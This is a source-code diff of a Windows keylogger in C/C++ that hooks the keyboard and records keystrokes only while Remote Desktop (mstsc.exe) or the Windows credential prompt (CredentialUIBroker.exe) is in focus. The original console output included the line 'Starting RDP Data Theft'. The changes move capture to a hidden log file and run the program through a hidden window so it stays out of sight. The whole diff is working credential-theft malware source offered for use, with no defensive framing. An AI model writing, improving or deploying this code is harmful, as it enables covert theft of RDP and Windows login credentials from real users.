@@ -2,6 +2,21 @@
 #include <tlhelp32.h>
 #include <stdio.h>
 
+// Function to log the output to a file
+void LogToFile(const char* format, ...) {
+    FILE* file;
+    fopen_s(&file, "logfile.txt", "a"); // Open file in append mode
+
+    if (file != NULL) {
+        va_list args;
+        va_start(args, format);
+
+        vfprintf(file, format, args); // Write formatted data to file
+
+        va_end(args);
+        fclose(file); // Close the file
+    }
+}
 
 DWORD GetProcId(const wchar_t* procName) {
     DWORD procId = 0;
@@ -22,12 +37,11 @@ DWORD GetProcId(const wchar_t* procName) {
     return procId;
 }
 
-
 BOOL isWindowOfProcessFocused(const wchar_t* processName) {
     // Get the PID of the process
     DWORD pid = GetProcId(processName);
     if (pid == 0) {
-        // Process not found
+        // Process not found :(
         return FALSE;
     }
 
@@ -52,125 +66,112 @@ BOOL isWindowOfProcessFocused(const wchar_t* processName) {
     return TRUE;
 }
 
-
 LRESULT CALLBACK KbdHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0) {
+        static int prev;
+        BOOL isLetter = TRUE;
 
         if (isWindowOfProcessFocused(L"mstsc.exe") || isWindowOfProcessFocused(L"CredentialUIBroker.exe")) {
-
-            static int prev;
-            BOOL isLetter = 1;
+            PKBDLLHOOKSTRUCT kbdStruct = (PKBDLLHOOKSTRUCT)lParam;
+            int vkCode = kbdStruct->vkCode;
 
             if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
-                PKBDLLHOOKSTRUCT kbdStruct = (PKBDLLHOOKSTRUCT)lParam;
-                int vkCode = kbdStruct->vkCode;
-
-                if (vkCode == 0xA2) { // LCTRL or initial signal of RALT
-                    prev = vkCode;
-                    return CallNextHookEx(NULL, nCode, wParam, lParam);
-                }
-
-                if (prev == 0xA2 && vkCode == 0xA5) { // RALT
-                    printf("<RALT>");
-                    isLetter = 0;
-                }
-                else if (prev == 0xA2 && vkCode != 0xA5) {
-                    printf("<LCTRL>");
-                }
-
                 BOOL shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
+                BOOL capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
 
                 switch (vkCode) {
-                case 0xA3: printf("<RCTRL>"); isLetter = 0; break;
-                case 0xA4: printf("<LALT>"); isLetter = 0; break;
-                case VK_CAPITAL: printf("<CAPSLOCK>"); isLetter = 0; break;
-                case 0x08: printf("<ESC>"); isLetter = 0; break;
-                case 0x0D: putchar('\n'); isLetter = 0; break;
-                case VK_OEM_PLUS: shiftPressed ? printf("+") : printf("="); isLetter = 0; break;
-                case VK_OEM_COMMA: shiftPressed ? printf("<") : printf(","); isLetter = 0; break;
-                case VK_OEM_MINUS: shiftPressed ? printf("_") : printf("-"); isLetter = 0; break;
-                case VK_OEM_PERIOD: shiftPressed ? printf(">") : printf("."); isLetter = 0; break;
-                case VK_OEM_1: shiftPressed ? printf(":") : printf(";"); isLetter = 0; break;
-                case VK_OEM_2: shiftPressed ? printf("?") : printf("/"); isLetter = 0; break;
-                case VK_OEM_3: shiftPressed ? printf("~") : printf("`"); isLetter = 0; break;
-                case VK_OEM_4: shiftPressed ? printf("{") : printf("["); isLetter = 0; break;
-                case VK_OEM_5: shiftPressed ? printf("|") : printf("\\"); isLetter = 0; break;
-                case VK_OEM_6: shiftPressed ? printf("}") : printf("]"); isLetter = 0; break;
-                case VK_OEM_7: shiftPressed ? printf("\"") : printf("'"); isLetter = 0; break;
-                default: break;
+                case VK_SHIFT:
+                case VK_LSHIFT:
+                case VK_RSHIFT:
+                    isLetter = FALSE; // Skip logging Shift key
+                    break;
+                case VK_CAPITAL:
+                    LogToFile("<CAPSLOCK>");
+                    isLetter = FALSE;
+                    break;
+                case VK_RETURN:
+                    LogToFile("\n");
+                    isLetter = FALSE;
+                    break;
+                case VK_SPACE:
+                    LogToFile(" ");
+                    isLetter = FALSE;
+                    break;
+                case VK_TAB:
+                    LogToFile("\t");
+                    isLetter = FALSE;
+                    break;
+                case VK_BACK:
+                    LogToFile("<BACKSPACE>");
+                    isLetter = FALSE;
+                    break;
+                case VK_OEM_PERIOD:
+                    if (shiftPressed) {
+                        LogToFile(">");
+                    }
+                    else {
+                        LogToFile(".");
+                    }
+                    isLetter = FALSE;
+                    break;
+                default:
+                    break;
+                }
+
+                if (isLetter) {
+                    BYTE keyState[256];
+                    GetKeyboardState(keyState);
+                    WORD translatedKey[2];
+                    if (ToAscii(vkCode, kbdStruct->scanCode, keyState, translatedKey, 0)) {
+                        char pressedKey = static_cast<char>(translatedKey[0]);
+                        LogToFile("%c", pressedKey);
+                    }
                 }
 
                 prev = vkCode;
-                if (isLetter) {
-                    BOOL capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
-                    if (vkCode >= 0x41 && vkCode <= 0x5A) {
-                        if (capsLock ^ shiftPressed) { // XOR operation, to check if exactly one of them is TRUE
-                            printf("%c", vkCode);
-                        }
-                        else {
-                            printf("%c", vkCode + 0x20); // Convert to lowercase
-                        }
-                    }
-                    else if (vkCode >= 0x61 && vkCode <= 0x7A) {
-                        if (capsLock ^ shiftPressed) {
-                            printf("%c", vkCode - 0x20); // Convert to uppercase
-                        }
-                        else {
-                            printf("%c", vkCode);
-                        }
-                    }
-                    else if (vkCode >= 0x30 && vkCode <= 0x39) { // Check if key is a number key
-                        if (shiftPressed) {
-                            switch (vkCode) {
-                            case '1': printf("!"); break;
-                            case '2': printf("@"); break;
-                            case '3': printf("#"); break;
-                            case '4': printf("$"); break;
-                            case '5': printf("%"); break;
-                            case '6': printf("^"); break;
-                            case '7': printf("&"); break;
-                            case '8': printf("*"); break;
-                            case '9': printf("("); break;
-                            case '0': printf(")"); break;
-                            default: break;
-                            }
-                        }
-                        else {
-                            printf("%c", vkCode);
-                        }
-                    }
-                }
             }
-
-
         }
-        else
-        {
-            // When the active window is not related to the specified processes, don't log.
-            return CallNextHookEx(NULL, nCode, wParam, lParam);
-        }
-
-
     }
 
     return CallNextHookEx(NULL, nCode, wParam, lParam);
-
 }
 
-int main(void) {
-    
-    printf("\n\n[+] Starting RDP Data Theft\n");
-    printf("[+] Waiting for RDP related processes\n\n");
-    HHOOK kbdHook = SetWindowsHookEx(WH_KEYBOARD_LL, KbdHookProc, 0, 0);
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    HHOOK kbdHook = SetWindowsHookEx(WH_KEYBOARD_LL, KbdHookProc, hInstance, 0);
+    if (kbdHook == NULL) {
+        // Hook installation failed
+        return 1;
+    }
 
-    while (true) {
-          
-            MSG msg;
+    // Create a hidden window
+    WNDCLASSEX wndClass = { 0 };
+    wndClass.cbSize = sizeof(WNDCLASSEX);
+    wndClass.lpszClassName = L"HiddenWindowClass";
+    wndClass.lpfnWndProc = DefWindowProc;
+    RegisterClassEx(&wndClass);
 
-            while (!GetMessage(&msg, NULL, 0, 0)) {
-                TranslateMessage(&msg);
-                DispatchMessage(&msg);
-            }
+    HWND hWnd = CreateWindowEx(
+        0,
+        L"HiddenWindowClass",
+        L"Hidden Window",
+        0,
+        0, 0, 0, 0,
+        HWND_MESSAGE,
+        NULL,
+        hInstance,
+        NULL
+    );
+
+    if (hWnd == NULL) {
+        // Failed to create hidden window
+        UnhookWindowsHookEx(kbdHook);
+        return 1;
+    }
+
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
     }
 
     UnhookWindowsHookEx(kbdHook);
